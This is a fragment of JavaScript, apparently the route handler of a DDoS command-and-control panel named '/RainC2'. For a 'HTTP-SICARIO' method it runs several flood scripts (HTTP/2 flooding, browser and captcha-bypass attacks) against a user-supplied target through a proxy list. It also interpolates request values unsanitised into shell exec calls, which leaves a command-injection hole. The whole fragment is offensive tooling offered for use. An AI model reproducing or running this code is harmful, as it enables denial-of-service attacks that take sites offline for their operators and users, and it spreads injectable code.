...
app.get('/RainC2', (req, res) => {
  ...
  if (methods === 'HTTP-SICARIO') {
    ...
    exec(`node Gravtius.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`);
    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
    exec(`node browser.js ${target} ${time} 5 4 6 proxy.txt`);
    ...
    exec(`node h2blast.js ${target} ${time} 19 8 proxy.txt`);
    exec(`node Gravtius.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`);
